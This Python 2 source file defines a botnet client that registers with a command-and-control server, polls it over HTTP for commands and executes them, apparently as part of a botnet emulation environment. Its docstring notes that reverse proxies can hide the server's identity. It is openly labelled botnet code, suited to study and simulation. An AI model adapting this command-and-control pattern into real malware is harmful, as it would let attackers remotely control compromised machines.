#!/usr/bin/env python2
# coding=UTF-8
import json, logging, random, requests

from actors import BotCommands
from AbstractBot import CommandExecutor
from resources import emu_config
from utils.LogfileParser import writeLogentry

class Bot(CommandExecutor):
    """Implements a bot that, in regular intervals, fetches commands from the given CnC-Server
    and renews its registration with said server. The possible commands are defined in BotCommands.py."""

    def __init__(self, peerlist=None, **kwargs):
        super(Bot, self).__init__(**kwargs)
        self.current_command = None
        self.threads = []
        self.peerlist = peerlist if peerlist is not None else list()

    def performDuty(self):
        # If there is a CnC-Server in the current_peerlist
        if len(self.peerlist) > 0:
            try:
                cncserver = random.choice(self.peerlist)
                self._registerWithCnCServer(cncserver)
                self._fetchCurrentCommand(cncserver)
                if self.current_command is not None:
                    self._executeCurrentCommand()
            except Exception as ex:
                logging.debug("Duty of bot %s failed with %s: %s" % (self.name, type(ex).__name__, ex))

    def _fetchCurrentCommand(self, cncserver):
        """Fetches a command from the CnC-Server and executes. This way the Botmaster can control the clients.
        The CnC-Server does not need to keep track of their addresses because they pull from it and reverse proxies
        can be used, so that the clients do not need to know the identity of the CnC-Server. """

        response = requests.get("http://%s:%s/current_command"%(cncserver, emu_config.PORT),
                                headers={"Accept": "application/json"})
        if response.status_code == 200:
            newCmd = json.loads(response.text)
            if newCmd != self.current_command:
                logging.debug("Replaced command %s with %s"%(self.current_command, newCmd))
                writeLogentry(runnable=type(self).__name__, message="received command: {'bot':%s, 'newcmd':%s, 'oldcmd':%s}"
                                                                    %json.dumps(
                    {"bot": self.name, "newcmd": newCmd, "oldcmd": self.current_command}))
            self.current_command = newCmd
        else:
            self.current_command = None

    def _executeCurrentCommand(self):
        """Executes the last command that has been fetched from the CnC-Server"""

        if isinstance(self.current_command, dict) and self.current_command.has_key("command") \
                and self.current_command["command"] != "":
            try:
                BotCommands.executeCurrentCommand(self.current_command)
            except TypeError as ex:
                logging.warning("Command %s got invalid parameters %s: %s"
                                % (self.current_command["command"], self.current_command["kwargs"], ex.message))

    def _registerWithCnCServer(self, cncserver):
        """Notifies the CnC-Server that this bot exists and is still operational."""

        response = requests.post("http://%s:%s/register" % (cncserver, emu_config.PORT),
                                 data={'id': self.name})
        if not response.text == "OK":
            logging.debug(
                "Registration of bot %s failed with %s: %s" % (self.name, response.status_code, response.text))
